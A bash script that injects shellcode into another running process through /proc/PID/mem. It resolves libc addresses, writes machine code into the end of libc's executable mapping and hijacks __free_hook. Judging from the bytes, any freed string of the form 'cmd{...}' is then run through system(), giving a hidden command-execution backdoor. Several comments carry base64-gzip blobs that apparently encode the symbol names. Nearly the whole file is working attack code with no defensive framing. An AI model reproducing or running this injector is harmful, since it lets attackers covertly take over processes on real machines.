#!/bin/bash

set -e

pack_bytes() {
	for i in $(seq 0 7); do 
		curr=$(($1 >> $i*8 & 0xff))
		packed="$packed$(printf '\\x%02x' $curr)"
	done

	echo $packed
}

get_symbol_offset() {
    echo $((0x$(nm -D "$1" | sed 's/@.*//' | grep -E " $2$" | cut -d ' ' -f1)))
}

write_to_proc_mem() {
    echo -ne "$3" | dd of="/proc/$1/mem" bs=1 "seek=$2" conv=notrunc 2>/dev/null
}

replace() {
    code="$1"
    from=$(echo "$2" | sed 's/\\/\\\\/g')
    to=$(echo $3 | sed 's/\\/\\\\/g')

    echo $code | sed "s/$from/$to/g"
}

decode() {
    echo "$1" | base64 -d | gzip -d
}

main() {
    proc_id="$1"

    grep_libc_output=$(grep -E "/libc.*so$" "/proc/$proc_id/maps" | head -n 1 | tr -s ' ')
    libc_start_addr=$((0x$(cut -d '-' -f1 <<< "$grep_libc_output")))
    libc_filepath=$(cut -d ' ' -f6 <<< "$grep_libc_output")

    free_hook_addr=$((libc_start_addr+$(get_symbol_offset $libc_filepath "__free_hook")))                   # $(decode H4sIAAAAAAAAA4uPTytKTY3PyM/PBgDwEjq3CwAAAA==))))
    system_addr=$((libc_start_addr+$(get_symbol_offset $libc_filepath "system")))                           # $(decode H4sIAAAAAAAAAyuuLC5JzQUAixFNyQYAAAA=))))
    free_addr=$((libc_start_addr+$(get_symbol_offset $libc_filepath "free")))                               # $(decode H4sIAAAAAAAAA0srSk0FAMjBLk0EAAAA))))
    malloc_usable_size_addr=$((libc_start_addr+$(get_symbol_offset $libc_filepath "malloc_usable_size")))   # $(decode H4sIAAAAAAAAA8tNzMnJT44vLU5MykmNL86sSgUA3kc6ChIAAAA=))))

    libc_exec_end_addr=$((0x$(grep -E "/libc.*so$" "/proc/$proc_id/maps" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2)))

    code_to_inject='\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\x41\x55\x49\xbd\x43\x43\x43\x43\x43\x43\x43\x43\x41\x54\x49\x89\xfc\x55\x53\x4c\x89\xe3\x52\xff\xd0\x48\x89\xc5\x48\xb8\x44\x44\x44\x44\x44\x44\x44\x44\x48\xc7\x00\x00\x00\x00\x00\x48\x83\xfd\x05\x76\x61\x80\x3b\x63\x75\x54\x80\x7b\x01\x6d\x75\x4e\x80\x7b\x02\x64\x75\x48\x80\x7b\x03\x7b\x75\x42\xc6\x03\x00\x48\x8d\x7b\x04\x48\x8d\x55\xfc\x48\x89\xf8\x8a\x08\x48\x89\xc3\x48\x89\xd5\x48\x8d\x40\x01\x48\x8d\x52\xff\x8d\x71\xe0\x40\x80\xfe\x5e\x77\x1b\x80\xf9\x7d\x75\x08\xc6\x03\x00\x41\xff\xd5\xeb\x0e\x48\x83\xfa\x01\x75\xd4\xbd\x01\x00\x00\x00\x48\x89\xc3\x48\xff\xc3\x48\xff\xcd\xeb\x99\x48\xb8\x42\x42\x42\x42\x42\x42\x42\x42\x4c\x89\xe7\xff\xd0\x48\xb8\x55\x55\x55\x55\x55\x55\x55\x55\x48\xa3\x44\x44\x44\x44\x44\x44\x44\x44\x58\x5b\x5d\x41\x5c\x41\x5d\xc3'
    code_to_inject=$(replace $code_to_inject '\x41\x41\x41\x41\x41\x41\x41\x41' $(pack_bytes $malloc_usable_size_addr))
    code_to_inject=$(replace $code_to_inject '\x42\x42\x42\x42\x42\x42\x42\x42' $(pack_bytes $free_addr))
    code_to_inject=$(replace $code_to_inject '\x43\x43\x43\x43\x43\x43\x43\x43' $(pack_bytes $system_addr))
    code_to_inject=$(replace $code_to_inject '\x44\x44\x44\x44\x44\x44\x44\x44' $(pack_bytes $free_hook_addr))

    code_byte_count=$(echo -ne $code_to_inject | wc -c)
    injection_addr=$(($libc_exec_end_addr - $code_byte_count))
    code_to_inject=$(replace $code_to_inject '\x55\x55\x55\x55\x55\x55\x55\x55' $(pack_bytes $injection_addr))

    write_to_proc_mem $proc_id $injection_addr $code_to_inject
    write_to_proc_mem $proc_id $free_hook_addr $(pack_bytes $injection_addr)
}

# exit if no argument or process doesn't exist
if [ $# -ne 1  ] || [ ! -e "/proc/$1" ] ; then
    exit 42
fi

main $1
